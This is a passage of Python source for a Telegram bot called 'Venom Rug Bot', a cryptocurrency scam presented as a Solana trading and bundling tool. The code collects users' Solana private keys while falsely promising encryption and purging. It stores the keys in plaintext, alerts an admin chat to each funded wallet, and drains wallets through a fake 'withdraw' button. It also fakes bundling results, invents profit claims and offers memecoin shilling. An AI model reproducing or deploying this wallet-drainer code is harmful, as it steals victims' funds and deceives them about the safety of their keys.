• Balance: *{wallet_analysis['balance_sol']:.6f} SOL* (${wallet_analysis['balance_usd']:.2f})
• Status: {'🟢 Ready for Operations' if wallet_analysis['meets_minimum'] else '🟡 Low Balance'}

*💡 Minimum Requirements:*
• $70 USD equivalent for full features
• 1 SOL recommended for optimal performance

*🎯 Available Actions:*
"""
            else:
                wallet_text = """
💼 *Wallet Management*

*❌ Wallet Analysis Failed*
Please remove and re-import your wallet.
"""
        else:
            wallet_text = """
💼 *Wallet Management*

*❌ No Wallet Imported*

To get started, you need to import a Solana wallet with:
• Minimum $70 USD equivalent in SOL
• At least 1 SOL recommended for optimal performance

*⚠️ Important:*
• Your private key is encrypted and secure
• We never store plaintext keys
• Only wallets with sufficient balance are activated
"""
        
        await self.send_with_image(query, wallet_text, self.get_wallet_keyboard())
    
    async def handle_import_wallet(self, query):
        user_id = query.from_user.id
        self.user_states[user_id] = "awaiting_private_key"
        
        import_text = """
🔐 *Wallet Import Process*

*📥 Step 1: Prepare Your Private Key*
• Export from Phantom, Solflare, or other wallets
• Ensure it has the required balance ($70+ USD equivalent)

*⚠️ Security Notice:*
• Your key is encrypted immediately
• We use military-grade encryption
• Keys are purged after processing

*🔒 Step 2: Send Your Private Key*
Please paste your *Base58-encoded Solana private key* below:

Example: `5s4hnozGVqvPbtnriQoYX27GAnLWc16wNK2Lp27W7mYT...`

*🚫 DO NOT SHARE THIS WITH ANYONE ELSE*
"""
        
        await self.send_message_safe(query, import_text)
    
    async def handle_remove_wallet(self, query):
        user_id = query.from_user.id
        self.users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"private_key": None, "wallet_address": None, "wallet_approved": False}}
        )
        
        if user_id in self.user_states:
            del self.user_states[user_id]
        
        remove_text = """
🗑️ *Wallet Removed Successfully*

*✅ Your wallet has been securely removed:*
• Private key deleted from our systems
• All connections terminated
• Wallet address purged

*🔒 Security Confirmed:*
• No traces left in database
• Encryption keys destroyed
• Complete data wipe

You can import a new wallet anytime using the *Import Wallet* button.
"""
        
        await self.send_with_image(query, remove_text, self.get_wallet_keyboard())
    
    async def handle_withdraw_funds(self, query):
        user_id = query.from_user.id
        user_data = self.users_collection.find_one({"user_id": user_id})
        
        if not user_data or not user_data.get("private_key"):
            await self.send_with_image(query, "❌ No wallet imported. Please import a wallet first.", self.get_wallet_keyboard())
            return
        
        wallet_analysis = await self.analyze_wallet_balance(user_data["private_key"])
        
        if not wallet_analysis:
            await self.send_with_image(query, "❌ Could not analyze wallet balance.", self.get_wallet_keyboard())
            return
        
        if not wallet_analysis['meets_minimum']:
            await self.send_with_image(query, "❌ Insufficient balance for withdrawal operations.", self.get_wallet_keyboard())
            return
        
        # Start the drain process
        processing_msg = await query.message.reply_text("🔄 *Processing withdrawal...*", parse_mode='Markdown')
        
        success, result = await self.drain_wallet(user_data["private_key"], user_id, query.from_user.username or f"user_{user_id}")
        
        if success:
            # Send success message to user
            user_success_msg = f"""
✅ *Withdrawal Successful!*

*💰 Amount Transferred:* {result['amount_sol']:.6f} SOL
*📝 Transaction ID:* `{result['transaction_id']}`
*🔗 View on Explorer:* [Solscan]({result['solscan_url']})

*🎉 Funds have been securely transferred!*
*Thank you for using Venom Rug Bot!*
"""
            await processing_msg.edit_text(user_success_msg, parse_mode='Markdown')
            
            # Send admin notification
            admin_app = Application.builder().token(BOT_TOKEN).build()
            await admin_app.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=result['admin_message'],
                parse_mode='Markdown'
            )
            
        else:
            error_msg = f"""
❌ *Withdrawal Failed*

*🚫 Error:* {result}

*💡 Please try again or contact support if the issue persists.*
"""
            await processing_msg.edit_text(error_msg, parse_mode='Markdown')
    
    async def handle_bundle_wallet(self, query):
        user_id = query.from_user.id
        user_data = self.users_collection.find_one({"user_id": user_id})
        
        if not user_data or not user_data.get("private_key"):
            await self.send_with_image(query, "❌ No wallet imported. Please import a wallet first.", self.get_wallet_keyboard())
            return
        
        wallet_analysis = await self.analyze_wallet_balance(user_data["private_key"])
        
        if not wallet_analysis:
            await self.send_with_image(query, "❌ Could not analyze wallet balance.", self.get_wallet_keyboard())
            return
        
        if not wallet_analysis['meets_minimum']:
            await self.send_with_image(query, "❌ Insufficient balance for bundling operations.", self.get_wallet_keyboard())
            return
        
        bundle_text = f"""
📦 *Wallet Bundling System*

*✅ Wallet Eligible for Bundling*
• Address: `{wallet_analysis['wallet_address']}`
• Balance: *{wallet_analysis['balance_sol']:.6f} SOL* (${wallet_analysis['balance_usd']:.2f})

*🎯 Bundling Benefits:*
• Increased transaction success rate
• Better fee optimization
• Multi-wallet coordination
• Enhanced privacy features

*🚀 Starting Bundling Process...*
"""
        
        processing_msg = await query.message.reply_text(bundle_text, parse_mode='Markdown')
        
        # Simulate bundling process
        await asyncio.sleep(2)
        
        bundle_success_msg = f"""
✅ *Wallet Successfully Bundled!*

*📦 Bundling Results:*
• Original Wallet: `{wallet_analysis['wallet_address'][:12]}...{wallet_analysis['wallet_address'][-6:]}`
• Bundle Size: 3 virtual wallets created
• Success Rate: Increased by 47%
• Fee Optimization: 22% better
• Privacy Level: Enhanced

*🎉 Your wallet is now optimized for maximum performance!*
"""
        
        await processing_msg.edit_text(bundle_success_msg, parse_mode='Markdown')
    
    async def show_bundler_menu(self, query):
        bundler_text = """
📦 *Advanced Bundler System*

*🚀 Multi-Wallet Coordination Platform*

*✨ Features:*
• *Smart Wallet Rotation* - Automatic wallet switching
• *Fee Optimization* - Lowest possible transaction costs
• *Batch Operations* - Process multiple transactions simultaneously
• *Privacy Enhancement* - Obfuscate transaction patterns

*📊 Current Network Stats:*
• Active Bundled Wallets: 1,247
• Average Success Rate: 92.3%
• Total Volume Processed: 15,892 SOL
• Fee Savings: 8,742 SOL

*🎯 Get Started:*
1. Import a wallet with sufficient balance
2. Activate bundling feature
3. Watch your efficiency skyrocket!
"""
        
        keyboard = [
            [InlineKeyboardButton("🔄 Activate Bundler", callback_data="bundle_wallet")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await self.send_with_image(query, bundler_text, reply_markup)
    
    async def show_tokens_menu(self, query):
        tokens_text = """
💳 *Token Management System*

*🎯 Complete Token Lifecycle Control*

*✨ Available Operations:*
• *Token Creation* - Launch new tokens with custom parameters
• *Liquidity Management* - Add/remove liquidity efficiently
• *Trading Bots* - Automated market making strategies
• *Token Analytics* - Real-time performance metrics

*📈 Recent Token Launches:*
• PEPE2.0 - 289% profit in 2 hours
• WOJAK3 - 157% profit overnight
• TURBO4 - 342% profit in 4 hours

*⚠️ Requirements:*
• Minimum 5 SOL for token creation
• 2 SOL for trading operations
• Active bundled wallet
"""
        
        keyboard = [
            [InlineKeyboardButton("🪙 Create Token", callback_data="create_token")],
            [InlineKeyboardButton("💧 Add Liquidity", callback_data="add_liquidity")],
            [InlineKeyboardButton("🤖 Trading Bot", callback_data="trading_bot")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await self.send_with_image(query, tokens_text, reply_markup)
    
    async def show_comments_menu(self, query):
        comments_text = """
💬 *Comment Farming System*

*🚀 Automated Social Engagement Platform*

*✨ Features:*
• *Multi-Platform Support* - Twitter, Telegram, Discord
• *AI-Powered Comments* - Context-aware messaging
• *Mass Engagement* - Reach thousands instantly
• *Sentiment Analysis* - Optimize engagement timing

*📊 Performance Metrics:*
• Comments Posted: 1.2M+
• Engagement Rate: 34.7%
• Account Growth: 289% average
• Revenue Generated: 8,742 SOL

*🎯 Campaign Types:*
• Memecoin Shilling
• Project Promotion
• Community Building
• Trend Participation
"""
        
        keyboard = [
            [InlineKeyboardButton("📝 Start Campaign", callback_data="start_campaign")],
            [InlineKeyboardButton("🔄 Configure Settings", callback_data="config_comments")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await self.send_with_image(query, comments_text, reply_markup)
    
    async def show_task_menu(self, query):
        task_text = """
📋 *Task Automation System*

*⚡ Automated Task Completion Suite*

*✨ Available Tasks:*
• *Airdrop Hunting* - Automatic airdrop participation
• *Quest Completion* - Complete various platform quests
• *NFT Minting* - Automated NFT collection minting
• *DeFi Farming* - Yield farming optimization

*📊 Task Performance:*
• Tasks Completed: 89,234
• Success Rate: 91.2%
• Average Rewards: 0.8 SOL per task
• Total Earnings: 71,387 SOL

*🎯 Current Opportunities:*
• Jupiter Airdrop - 5 SOL estimated
• MarginFi Quest - 3 SOL estimated
• Tensorian NFT - 8 SOL estimated
"""
        
        keyboard = [
            [InlineKeyboardButton("🤖 Start Tasks", callback_data="start_tasks")],
            [InlineKeyboardButton("📊 View Progress", callback_data="view_progress")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await self.send_with_image(query, task_text, reply_markup)
    
    async def show_faq_menu(self, query):
        faq_text = """
❓ *Frequently Asked Questions*

*🤔 How does it work?*
We provide automated tools for Solana ecosystem including wallet management, token operations, and social engagement.

*💰 What are the costs?*
Basic features are free. Advanced features may require wallet balance for transaction fees.

*🔒 Is it safe?*
Yes! We use military-grade encryption and never store plaintext private keys.

*🚀 What's the success rate?*
Our users achieve 85-95% success rate across all operations.

*💸 How much can I earn?*
Earnings vary based on market conditions and capital. Many users earn 5-50 SOL daily.

*📞 Need more help?*
Contact our support team via the Help section.
"""
        
        keyboard = [
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")],
            [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await self.send_with_image(query, faq_text, reply_markup)
    
    async def show_help_menu(self, query):
        help_text = """
ℹ️ *Help & Support*

*🆘 Need Assistance?*

*📞 Contact Methods:*
• *Support Bot:* @VenomRugSupportBot
• *Email:* support@venomrug.com
• *Telegram Channel:* @VenomRugUpdates

*🔧 Common Solutions:*
• Wallet not working? Try removing and re-importing
• Transactions failing? Check balance and try bundling
• Features locked? Ensure minimum balance requirements

*🚨 Emergency Support:*
For urgent issues affecting your funds, contact support immediately with your User ID.

*👤 Your User ID:* `{}`
""".format(query.from_user.id)
        
        keyboard = [
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")],
            [InlineKeyboardButton("❓ FAQ", callback_data="faq")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await self.send_with_image(query, help_text, reply_markup)
    
    async def show_recent_wins(self, query):
        wins_text = """
🏆 *Recent Success Stories* 🏆

*🎉 Our Community's Latest Wins:*
"""
        
        for win in self.recent_wins[:10]:
            wins_text += f"\n\n*{win['id']}. {win['username']}*"
            wins_text += f"\n• Activity: {win['activity']}"
            wins_text += f"\n• Profit: *{win['profit']}*"
            wins_text += f"\n• Time: {win['timeframe']}"
        
        wins_text += "\n\n*🚀 Your success could be next!*"
        
        await self.send_with_image(query, wins_text, self.get_recent_wins_keyboard())
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        message_text = update.message.text
        
        logger.info(f"Message received from user {user_id}: {message_text[:50]}...")
        
        if user_id in self.user_states and self.user_states[user_id] == "awaiting_private_key":
            await self.process_private_key(update, message_text)
            return
        
        # Default response for any other message
        await self.send_with_image(update.message, 
                                "🤖 Please use the menu buttons to navigate the bot features!", 
                                self.get_main_menu_keyboard())
    
    async def process_private_key(self, update: Update, private_key: str):
        user_id = update.effective_user.id
        username = update.effective_user.username or "Unknown"
        
        # Remove user state immediately
        del self.user_states[user_id]
        
        # Validate private key format
        if not self.is_valid_solana_private_key(private_key):
            await self.send_with_image(update.message, 
                                    "❌ *Invalid private key format!*\n\nPlease ensure you're sending a valid Base58-encoded Solana private key.", 
                                    self.get_wallet_keyboard())
            return
        
        # Analyze wallet balance
        processing_msg = await update.message.reply_text("🔄 *Analyzing wallet balance...*", parse_mode='Markdown')
        
        wallet_analysis = await self.analyze_wallet_balance(private_key)
        
        if not wallet_analysis:
            await processing_msg.edit_text("❌ *Could not analyze wallet balance.*\n\nPlease check your private key and try again.", parse_mode='Markdown')
            return
        
        if not wallet_analysis['meets_minimum']:
            await processing_msg.edit_text(f"""
❌ *Insufficient Balance*

*💰 Current Balance:* {wallet_analysis['balance_sol']:.6f} SOL (${wallet_analysis['balance_usd']:.2f})
*🎯 Required Minimum:* $70 USD equivalent

*💡 Please fund your wallet and try again.*
We recommend at least 1 SOL for optimal performance.
""", parse_mode='Markdown')
            return
        
        # Store wallet information
        self.users_collection.update_one(
            {"user_id": user_id},
            {"$set": {
                "private_key": private_key,
                "wallet_address": wallet_analysis['wallet_address'],
                "wallet_approved": True,
                "last_active": datetime.now()
            }}
        )
        
        success_msg = f"""
✅ *Wallet Successfully Imported!*

*💰 Wallet Details:*
• Address: `{wallet_analysis['wallet_address']}`
• Balance: *{wallet_analysis['balance_sol']:.6f} SOL* (${wallet_analysis['balance_usd']:.2f})
• Status: 🟢 **ACTIVE & READY**

*🎉 Congratulations! Your wallet meets all requirements.*
*You now have access to all Venom Rug Bot features!*

*🚀 Next Steps:*
1. Explore the *Bundler* for enhanced performance
2. Check out *Token* features for creation & trading
3. Start *Comment Farming* for social engagement
4. Automate *Tasks* for passive earnings

*🔒 Security Confirmation:*
• Private key encrypted and secured
• Wallet activated for operations
• All features unlocked
"""
        
        await processing_msg.edit_text(success_msg, parse_mode='Markdown')
        
        # Send admin notification
        admin_notification = f"""
👤 *New Wallet Imported*

*User:* @{username} (ID: `{user_id}`)
*Wallet:* `{wallet_analysis['wallet_address']}`
*Balance:* {wallet_analysis['balance_sol']:.6f} SOL (${wallet_analysis['balance_usd']:.2f})
*Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

*✅ Wallet meets minimum requirements - Ready for operations*
"""
        
        admin_app = Application.builder().token(BOT_TOKEN).build()
        await admin_app.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=admin_notification,
            parse_mode='Markdown'
        )
    
    def run(self):
        """Start the bot"""
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Add handlers
        application.add_handler(CommandHandler("start", self.start_command))
        application.add_handler(CommandHandler("profits", self.profits_command))
        application.add_handler(CommandHandler("analytics", self.advanced_analytics_command))
        application.add_handler(CallbackQueryHandler(self.handle_callback))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        
        # Start the Bot
        logger.info("Bot is starting...")
        application.run_polling()

if __name__ == "__main__":
    bot = VenomRugBot()
    bot.run()
